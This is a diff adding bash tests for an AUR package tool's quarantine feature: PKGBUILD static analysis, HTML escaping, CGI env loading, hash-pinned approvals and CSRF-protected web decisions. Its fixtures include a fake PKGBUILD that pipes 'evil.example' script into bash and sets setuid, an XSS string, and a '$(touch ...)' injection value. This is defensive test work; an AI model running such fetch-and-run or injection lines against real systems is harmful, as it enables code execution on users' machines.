@@ -518,6 +518,112 @@ for v in PACMAN_MIRROR KEEP_VERSIONS ABI_CHECK; do
 done
 
 echo
+echo "=== quarantine management: escape / analysis / decisions / package page ==="
+# --- html_escape must really escape (bash >= 5.2 patsub_replacement trap) -----
+# shellcheck disable=SC1090
+( source "${SCRIPTS}/lib-aur.sh"
+  assert_eq "$(html_escape '<script>alert("x")</script> & '"'"'q'"'"'')" \
+      '&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt; &amp; &#39;q&#39;' "html_escape escapes < > & quotes on this bash" ) || true
+assert_eq "$( source "${SCRIPTS}/lib-aur.sh"; html_escape '<b>' )" '&lt;b&gt;' "html_escape: < never survives"
+
+# --- CGI environment file (lighttpd passes CGIs almost no env) ---------------
+CE="${TEST_TMP}/cgi.env"
+printf 'export GITHUB_TOKEN=%q\nexport REPO_NAME=%q\nexport EVIL=%q\n' 'tok$(touch '"${TEST_TMP}"'/pwned)' 'my-repo' x > "$CE"
+got="$( unset GITHUB_TOKEN REPO_NAME EVIL; AUR_FORGE_CGI_ENV="$CE" bash -c 'source "$1"; echo "$GITHUB_TOKEN|$REPO_NAME|${EVIL:-unset}"' _ "${SCRIPTS}/lib-aur.sh" )"
+assert_eq "$got" 'tok$(touch '"${TEST_TMP}"'/pwned)|my-repo|unset' "lib-aur.sh loads allow-listed vars from the CGI env file (no eval of values, others ignored)"
+[[ ! -e "${TEST_TMP}/pwned" ]] && pass "CGI env file values are never executed" || fail "CGI env file value was executed"
+assert_eq "$(unset REPO_NAME; REPO_NAME=preset AUR_FORGE_CGI_ENV="$CE" bash -c 'source "$1"; echo $REPO_NAME' _ "${SCRIPTS}/lib-aur.sh")" "preset" "variables already set by the caller win over the env file"
+grep -q 'write_cgi_env' "${REPO_ROOT}/run.sh" && pass "run.sh writes the CGI env file" || fail "run.sh does not write the CGI env file"
+
+# --- static findings ---------------------------------------------------------
+QM="${TEST_TMP}/qm"; mkdir -p "$QM"
+cat > "$QM/PKGBUILD" <<'EOP'
+pkgname=demo
+pkgver=1.0
+pkgrel=1
+source=("http://example.com/x.tar.gz")
+sha256sums=('SKIP')
+# curl http://commented | sh
+prepare() {
+  curl -s https://evil.example/x.sh | bash
+  npm install atomic-lockfile
+}
+package() {
+  chmod 4755 "$pkgdir/usr/bin/demo"
+}
+EOP
+# shellcheck disable=SC1090
+source "${SCRIPTS}/pkg-analysis.sh"
+fnd="$(pkgbuild_findings "$QM/PKGBUILD")"
+for rule in pipe-to-shell installs-from-network-at-build setuid plain-http-source checksum-skipped miner-or-known-bad-word; do
+    case "$fnd" in *"$rule"*) pass "findings: $rule detected" ;; *) fail "findings: $rule NOT detected" ;; esac
+done
+case "$fnd" in *$'6\t'*) fail "findings: commented-out line must be ignored" ;; *) pass "findings: commented-out lines ignored" ;; esac
+clean="${TEST_TMP}/clean-pkgbuild"; printf 'pkgname=ok\npkgver=1\npkgrel=1\nsource=("https://example.com/a.tar.gz")\nsha256sums=("abc")\npackage() {\n  install -Dm755 a "$pkgdir/usr/bin/a"\n}\n' > "$clean"
+assert_eq "$(findings_summary "$clean")" "0 high, 0 medium, 0 info" "findings: an ordinary PKGBUILD is clean"
+printf 'b2sums=(\x27%s\x27)\n' "$(printf 'a%.0s' $(seq 128))" > "${TEST_TMP}/sums-pkgbuild"
+assert_eq "$(findings_summary "${TEST_TMP}/sums-pkgbuild")" "0 high, 0 medium, 0 info" "findings: checksum arrays are not 'obfuscated blobs'"
+
+# --- stash matching, snapshots, decisions ------------------------------------
+export QUARANTINE_DIR="${TEST_TMP}/qdir"; mkdir -p "$QUARANTINE_DIR/demo-4242" "$QUARANTINE_DIR/demo-1-extra-77"
+cp "$QM/PKGBUILD" "$QUARANTINE_DIR/demo-4242/PKGBUILD"; echo 'x' > "$QUARANTINE_DIR/demo-1-extra-77/PKGBUILD"
+# shellcheck disable=SC1090
+source "${SCRIPTS}/gate-lib.sh"
+assert_eq "$(quarantine_stashes demo | xargs -n1 basename | tr '\n' ' ')" "demo-4242 " "stash lookup is exact (does not match demo-1-extra-77)"
+want_sha="$(sha256sum "$QUARANTINE_DIR/demo-4242/PKGBUILD" | awk '{print $1}')"
+DECIDED_BY=tester
+EXPECT_SHA="$(printf 'f%.0s' $(seq 64))"
+rc=0; quarantine_decision approve demo >/dev/null 2>&1 || rc=$?
+assert_eq "$rc" "3" "approve refuses when the PKGBUILD differs from what the reviewer saw"
+[[ -d "$QUARANTINE_DIR/demo-4242" && ! -s "${APPROVALS_DIR}/demo.json" ]] && pass "refused approve changed nothing" || fail "refused approve modified state"
+EXPECT_SHA="$want_sha"
+rc=0; out="$(quarantine_decision approve demo 2>&1)" || rc=$?
+assert_eq "$rc" "0" "approve succeeds with the matching hash"
+assert_eq "$(jq -r .pkgbuild_sha256 "${APPROVALS_DIR}/demo.json")" "$want_sha" "approval stores the sha256 of the REVIEWED PKGBUILD"
+assert_eq "$(jq -r .approved_by "${APPROVALS_DIR}/demo.json")" "tester" "approval records who decided"
+[[ -f "${APPROVALS_DIR}/demo.snapshot/PKGBUILD" ]] && pass "approved PKGBUILD snapshot kept (for future diffs)" || fail "no snapshot after approval"
+assert_eq "$(jq -r .event "${APPROVALS_DIR}/demo.history.jsonl" | tail -1)" "approved" "history records the approval"
+[[ ! -d "$QUARANTINE_DIR/demo-4242" && -d "$QUARANTINE_DIR/demo-1-extra-77" ]] && pass "approve removes only this package's stash" || fail "stash handling wrong after approve"
+# reject path
+mkdir -p "$QUARANTINE_DIR/demo-9999"; cp "$QM/PKGBUILD" "$QUARANTINE_DIR/demo-9999/PKGBUILD"; EXPECT_SHA=""
+rc=0; quarantine_decision reject demo >/dev/null 2>&1 || rc=$?
+assert_eq "$rc" "0" "reject succeeds"
+rejection_matches demo "$want_sha" && pass "rejection remembers the exact PKGBUILD hash" || fail "rejection hash not remembered"
+rejection_matches demo "$(printf 'a%.0s' $(seq 64))" && fail "a different PKGBUILD must not match the rejection" || pass "a changed PKGBUILD is not covered by the rejection"
+rc=0; quarantine_decision approve demo >/dev/null 2>&1 || rc=$?
+assert_eq "$rc" "4" "deciding with nothing quarantined → 4"
+rc=0; quarantine_decision approve 'bad/name' >/dev/null 2>&1 || rc=$?
+assert_eq "$rc" "2" "invalid package name → 2"
+clear_rejection demo; rejection_matches demo "$want_sha" && fail "clear_rejection did nothing" || pass "clear_rejection forgets the rejection"
+
+# --- package.cgi -------------------------------------------------------------
+CGI_ENV=( PKG_PAGE_OFFLINE=1 APPROVALS_DIR="$APPROVALS_DIR" QUARANTINE_DIR="$QUARANTINE_DIR" REPO_DIR="${TEST_TMP}/pk-repo"
+          PKGLIST="${TEST_TMP}/pk-pkglist" CSRF_SECRET_FILE="${TEST_TMP}/pk-csrf" ABI_STATE_DIR="${TEST_TMP}/pk-abi"
+          CHECK_ABI=/nonexistent AUR_FORGE_LOG_FILE="${TEST_TMP}/pk.log" )
+mkdir -p "${TEST_TMP}/pk-repo"; echo demo > "${TEST_TMP}/pk-pkglist"
+mkdir -p "$QUARANTINE_DIR/demo-5555"; cp "$QM/PKGBUILD" "$QUARANTINE_DIR/demo-5555/PKGBUILD"
+page="$(env "${CGI_ENV[@]}" REQUEST_METHOD=GET QUERY_STRING='name=demo' bash "${REPO_ROOT}/cgi-bin/package.cgi" 2>&1)"
+for needle in "Quarantine" "pipe-to-shell" "Decision" 'name="sha"' "$(sha256sum "$QUARANTINE_DIR/demo-5555/PKGBUILD" | awk '{print $1}')" "PKGBUILD diff vs. last approved"; do
+    case "$page" in *"$needle"*) pass "package page shows: $needle" ;; *) fail "package page missing: $needle" ;; esac
+done
+case "$page" in *"<script>alert"*|*"<lt;"*) fail "package page leaks unescaped HTML" ;; *) pass "package page escapes PKGBUILD text" ;; esac
+case "$(env "${CGI_ENV[@]}" REQUEST_METHOD=GET QUERY_STRING='name=%3Cscript%3E' bash "${REPO_ROOT}/cgi-bin/package.cgi" 2>&1)" in
+    *"400"*) pass "package page rejects an invalid package name" ;; *) fail "invalid name not rejected" ;; esac
+# POST: CSRF, confirmation, argument pinning
+post() { local body="$1"; env "${CGI_ENV[@]}" REQUEST_METHOD=POST CONTENT_LENGTH="${#body}" AUR_FORGE_DECIDE_SH="${TEST_TMP}/decide-stub" bash "${REPO_ROOT}/cgi-bin/package.cgi" <<<"$body" 2>&1; }
+printf '#!/bin/sh\necho "STUB $*"\n' > "${TEST_TMP}/decide-stub"; chmod +x "${TEST_TMP}/decide-stub"
+tok="$( source "${SCRIPTS}/lib-aur.sh"; CSRF_SECRET_FILE="${TEST_TMP}/pk-csrf" csrf_form_field )"
+sha5="$(sha256sum "$QUARANTINE_DIR/demo-5555/PKGBUILD" | awk '{print $1}')"
+case "$(post "name=demo&action=approve&sha=${sha5}&confirm=yes")" in *403*) pass "POST without CSRF → 403" ;; *) fail "POST without CSRF accepted" ;; esac
+case "$(post "csrf=${tok}&name=demo&action=approve&sha=${sha5}")" in *"Tick the confirmation"*) pass "approve without the confirmation checkbox is refused" ;; *) fail "approve without confirm not refused" ;; esac
+case "$(post "csrf=${tok}&name=demo&action=approve&sha=nothex&confirm=yes")" in *"Missing PKGBUILD hash"*) pass "approve without a valid pinned hash is refused" ;; *) fail "approve without sha not refused" ;; esac
+out="$(post "csrf=${tok}&name=demo&action=approve&sha=${sha5}&confirm=yes")"
+case "$out" in *"STUB approve demo --sha ${sha5} --by web-ui"*) pass "approve passes the reviewed sha256 to quarantine-decide.sh" ;; *) fail "approve did not delegate correctly: $out" ;; esac
+out="$(post "csrf=${tok}&name=demo&action=reject&sha=${sha5}&confirm=yes")"
+case "$out" in *"STUB reject demo --sha ${sha5}"*) pass "reject delegates with the pinned sha256" ;; *) fail "reject did not delegate: $out" ;; esac
+case "$(post "csrf=${tok}&name=demo&action=format-disk&confirm=yes")" in *"Unknown action"*) pass "unknown actions are refused" ;; *) fail "unknown action accepted" ;; esac
+
+echo
 echo "=== summary ==="
 echo "passed: $PASS"
 echo "failed: $FAIL"
